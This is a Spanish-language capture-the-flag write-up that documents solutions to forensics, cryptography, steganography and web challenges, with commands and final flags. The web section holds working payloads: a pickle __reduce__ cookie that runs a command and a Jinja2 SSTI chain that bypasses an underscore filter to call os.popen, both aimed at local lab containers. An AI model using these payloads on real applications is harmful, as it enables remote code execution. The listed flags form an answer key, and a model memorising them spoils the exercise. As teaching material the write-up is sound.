# Documentación técnica completa — CTF Ciberseguridad 2026-2

> Registro reproducible de todo el trabajo realizado: comandos exactos, scripts, hallazgos y banderas.
> Formato de bandera del CTF: **`FLAG{ md5(respuesta) }`**.

## Entorno de trabajo
- **SO:** Windows 11 Pro. Shell: Git Bash + PowerShell.
- **Herramientas disponibles:** `file`, `xxd`, `dd`, `md5sum`, `sha256sum`, `base64`, `openssl`, `node` (v16), `docker` + `docker compose`, `curl`.
- **No disponibles (se suplieron con Node.js propio):** Python, ImageMagick, sox, ffmpeg, zbar.
- **Organización:** cada reto en `RETOS/retoNN_nombre/` con su `descripcion.txt`, evidencia y, cuando aplica, `SOLUCION_*`.

---

## Reto 2 — Entrega el equipo  (FORENSE)
**Evidencia:** `usb_lab.img` · **Respuesta:** `borrar_no_es_destruir`
**Bandera:** `FLAG{1d9b3ce7d2e720aded00119d860d5dd3}`

```bash
file usb_lab.img                       # FAT16, etiqueta LAB_USB
# raiz = sector 1 + 2*191 = 383 (offset 0x2FE00); datos = sector 415
xxd -s $((383*512)) -l 1024 usb_lab.img   # entrada con byte 0xE5 = archivo BORRADO: respaldo_privado.png (cluster 15)
# carving: extraer el PNG borrado (cluster 15 -> sector 415 + (15-2) = 428)
dd if=usb_lab.img of=respaldo_privado.png bs=1 skip=$(((415+15-2)*512)) count=$((0x34f8)) status=none
# la imagen muestra: FLAG{borrar_no_es_destruir}
printf 'borrar_no_es_destruir' | md5sum      # 1d9b3ce7d2e720aded00119d860d5dd3
```
**Lección:** borrar solo marca la entrada del directorio (0xE5) y libera la FAT; los datos siguen ahí hasta ser sobrescritos. Recuperable con Recuva/PhotoRec/Autopsy.

---

## Reto 4 — Mensaje en capas  (CRYPTO)
**Entrada:** `U1lOVHt5YnBiZmNiZXJhcGV2Y2duZX0=` · **Respuesta:** `locosporencriptar`
**Bandera:** `FLAG{b3826186c4f26cb2ec3d553c29a1d854}`

```bash
echo 'U1lOVHt5YnBiZmNiZXJhcGV2Y2duZX0=' | base64 -d      # SYNT{ybpbfcberapevcgne}
echo 'SYNT{ybpbfcberapevcgne}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'   # ROT13 -> FLAG{locosporencriptar}
printf 'locosporencriptar' | md5sum                      # b3826186c4f26cb2ec3d553c29a1d854
```
**Lección:** `SYNT{...}` = `FLAG{...}` en ROT13.

---

## Reto 5 — Token oculto  (CRYPTO / JWT)
**Respuesta:** `subanleladificultad`
**Bandera:** `FLAG{14c30d7fda5f448f85cbb99e2bf0fb1d}`

```bash
# El payload (parte central del JWT) es solo Base64:
echo 'eyJzdWIiOiJEZW1hc2lhZG8gRmFjaWwgbGEgdmVyZGFkIiwiRkxBRyI6InN1YmFubGVsYWRpZmljdWx0YWQifQ==' | base64 -d
# {"sub":"Demasiado Facil la verdad","FLAG":"subanleladificultad"}
printf 'subanleladificultad' | md5sum          # 14c30d7fda5f448f85cbb99e2bf0fb1d
```
**Lección:** un JWT no cifra; su payload es legible por cualquiera.

---

## Reto 6 — Mira bien (QR)  (MISC)
**Evidencia:** `qr_url.png` · **Respuesta:** `estabafacilaceptalo`
**Bandera:** `FLAG{7d8164bfb5aea664e69bf3db6e99f0df}`

- Escaneo del QR → `dominio-completamente-falso.com/mira-bien?id=123456789&FLAG=FLAG%7Bestabafacilaceptalo%7D`
- `%7B`=`{`, `%7D`=`}` → `FLAG{estabafacilaceptalo}` (el dominio es falso, no se visita).

```bash
printf 'estabafacilaceptalo' | md5sum           # 7d8164bfb5aea664e69bf3db6e99f0df
```

---

## Reto 10 — Encuentra las diferencias  (MISC / estego por diff)
**Evidencia:** `original.png`, `alterada.png` · **Respuesta:** `dos_imagenes_un_secreto`
**Bandera:** `FLAG{0bafe092da11756f0bf650e5b479c729}`

Sin ImageMagick/Python se programó un **decodificador PNG en Node.js** (`_scripts/pngdiff.js`, `_scripts/pngmake.js`) que:
1. Infla el zlib de los chunks IDAT y aplica el des-filtrado PNG.
2. Compara píxel a píxel (23 695 píxeles distintos en la franja y=339–402).
3. Exporta solo las diferencias a blanco/negro → se lee `FLAG{dos_imagenes_un_secreto}`.

```bash
node _scripts/pngdiff.js original.png alterada.png     # reporta bbox de diferencias
node _scripts/pngmake.js original.png alterada.png diff.png   # genera imagen con el texto
printf 'dos_imagenes_un_secreto' | md5sum              # 0bafe092da11756f0bf650e5b479c729
```
Evidencia visual: `reto10_.../SOLUCION_diff.png`.

---

## Reto 11 — Melodía con mensaje  (MISC)
**Evidencia:** `partitura_inglesa.png` · **Respuesta:** `DEADBEEF`
**Bandera:** `FLAG{7bc3a60fbf38e98f6fef654afa26d270}`

- Título: *"Hexadecimal Waltz for 0xC0FFEE"* → las notas A–G deletrean una palabra hexadecimal.
- Detección algorítmica (`_scripts/notes3.js` / `notes4.js`): pentagrama en y=78,85,92,99,106; se confirmó la secuencia `...B-E-E-F`.
- Palabra: **DEADBEEF** (constante hex icónica). `0xC0FFEE` es señuelo.

```bash
printf 'DEADBEEF' | md5sum        # 7bc3a60fbf38e98f6fef654afa26d270
```

---

## Reto 13 — A simple vista  (FORENSE / espectrograma)
**Evidencia:** `lee_la_cancion.wav` · **Respuesta:** `wowestoessupercool`
**Bandera:** `FLAG{24c2886252fdd830c4fa3c80544d67b0}`

- El enunciado ("léelo") indica que el mensaje está en el **espectrograma**.
- Sin sox/ffmpeg se implementó un **generador de espectrograma en Node.js** (`_scripts/spec.js`): lee el WAV PCM 16-bit, STFT (ventana Hann 1024, hop 256), FFT radix-2, render a PNG.
- El espectrograma muestra `FLAG{wowestoessupercool}`.

```bash
node _scripts/spec.js lee_la_cancion.wav spec.png
printf 'wowestoessupercool' | md5sum      # 24c2886252fdd830c4fa3c80544d67b0
```
Evidencia visual: `reto13_.../SOLUCION_espectrograma.png`.

---

## Retos Web (15, 16, 17) — metodología común

```bash
docker pull maosuarez/<imagen>:latest
docker run -d --name <c> -p 800X:8000 maosuarez/<imagen>:latest
docker exec <c> cat /app/app.py          # leer el codigo fuente -> ubicar la vulnerabilidad
# explotar -> ejecutar /getflag -> imprime FLAG{tipo_hash}
# Bandera final = FLAG{ md5(contenido_interno) }
```

### Reto 15 — Health Checker (SSRF)
- Imagen `maosuarez/ssrf-health-checker`. La app consulta URLs desde el servidor → se abusa para alcanzar servicios internos.
- `/getflag` → `FLAG{ssrf_a17251c0b759f57d}`. La flag del compose (`de_verdad..._tan_facil`) es señuelo.
```bash
printf 'ssrf_a17251c0b759f57d' | md5sum     # 33944ccbc48a1c0170d71f908cfeae14
```
**Bandera:** `FLAG{33944ccbc48a1c0170d71f908cfeae14}` ✅

### Reto 16 — Como te gusta (Pickle / deserialización insegura)
- La app hace `pickle.loads(base64.b64decode(cookie 'prefs'))` sin validar.
- Cookie maliciosa con `__reduce__` → `subprocess.check_output(['/getflag'])` → RCE reflejado en la respuesta.
- `/getflag` → `FLAG{pickle_8a0b9308958289cc}`.
```bash
# generar cookie maliciosa usando el python del contenedor:
docker exec pickle python -c "import pickle,base64,subprocess
class E:
    def __reduce__(self): return (subprocess.check_output, (['/getflag'],))
print(base64.b64encode(pickle.dumps(E())).decode())"
# enviar: curl http://localhost:8002/ -b "prefs=<PAYLOAD>"
printf 'pickle_8a0b9308958289cc' | md5sum    # 604db99b954342cf324953c7a606cbe4
```
**Bandera:** `FLAG{604db99b954342cf324953c7a606cbe4}`

### Reto 17 — Mucho gusto (SSTI / Jinja2)
- `render_template_string("<h2>Hola, "+name+"!</h2>")`. Confirmación: `/greet?name={{7*7}}` → `49`.
- Filtro bloquea `_` solo en `name`; los dunder se pasan por otros parámetros y se usan con `request.args.X`.
```
/greet?name={{config|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)
      |attr(request.args.g)("os")|attr("popen")("/getflag")|attr("read")()}}
      &a=__class__&b=__init__&c=__globals__&g=get
```
- `/getflag` → `FLAG{ssti_8a845419c06bae52}`.
```bash
printf 'ssti_8a845419c06bae52' | md5sum       # f55cc16f919378e35e2939353c57c12b
```
**Bandera:** `FLAG{f55cc16f919378e35e2939353c57c12b}`

---

## Retos en proceso / análisis

### Reto 7 — Mambrú ha vuelto (CRYPTO) — analizado, bloqueado
- 5 decodificaciones Base64 → bloque RSA (256 B) + clave privada RSA-2048 (DER).
- Descifrado: **RSA-OAEP, SHA-256, MGF1-SHA-1**:
```bash
openssl pkeyutl -decrypt -inkey private.der -keyform DER -in rsa.bin \
  -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha1
# -> https://www.youtube.com/watch?v=aNCCuzYbyOx
```
- **Hallazgo:** `aNCCuzYbyOx` es un ID de YouTube inválido (termina en `x`); error 400 (malformado), no existe. Se probaron las 16 terminaciones válidas (todas 404) y transformaciones (ROT13/reverse/atbash/base64). El reto apunta a un recurso inexistente. Pendiente de aclaración de formato con el docente.

### Reto 9 — Informanchester (OSINT) — en proceso
- Cuenta `@informanchesteroficial` (UCT Temuco, 6 posts).
- Formato de respuesta: `num_jugadores_IDúltimaIncorporación` → MD5.
- Pendiente: conteo de jugadores y localización del ID institucional en captions/fotos.

### Reto 14 — Final Copa Sudamericana (CRYPTO) — en proceso
- Hash SHA-256 `9a7d5a74...` = una línea de un cántico de la hinchada de Boca (música de Los Palmeras, "Aprenderás a llorar").
- Se probaron ~8 000 variantes de la letra (líneas, sub-frases, tildes, mayúsculas, espacios). Pendiente: el *wording* exacto byte-a-byte del autor.

### Reto 3 — Resolución de nombres (DNS) — sin evidencia
- Requiere archivo de captura `.pcap` (no entregado). Sin él no es resoluble.

---

## Scripts propios (carpeta `_scripts/`)
| Script | Función |
|--------|---------|
| `pngdiff.js` | Decodifica 2 PNG y mapea diferencias de píxel (reto 10) |
| `pngmake.js` | Exporta las diferencias como imagen B/N legible (reto 10) |
| `spec.js` | Genera espectrograma (STFT+FFT) de un WAV (reto 13) |
| `upscale.js` | Amplía una imagen (lectura de partitura, reto 11) |
| `notes3.js`, `notes4.js` | Detectan pentagrama y cabezas de nota (reto 11) |

## Banderas finales (resumen)
```
Reto 2   FLAG{1d9b3ce7d2e720aded00119d860d5dd3}
Reto 4   FLAG{b3826186c4f26cb2ec3d553c29a1d854}
Reto 5   FLAG{14c30d7fda5f448f85cbb99e2bf0fb1d}
Reto 6   FLAG{7d8164bfb5aea664e69bf3db6e99f0df}
Reto 10  FLAG{0bafe092da11756f0bf650e5b479c729}
Reto 11  FLAG{7bc3a60fbf38e98f6fef654afa26d270}
Reto 13  FLAG{24c2886252fdd830c4fa3c80544d67b0}
Reto 15  FLAG{33944ccbc48a1c0170d71f908cfeae14}
Reto 16  FLAG{604db99b954342cf324953c7a606cbe4}
Reto 17  FLAG{f55cc16f919378e35e2939353c57c12b}
```
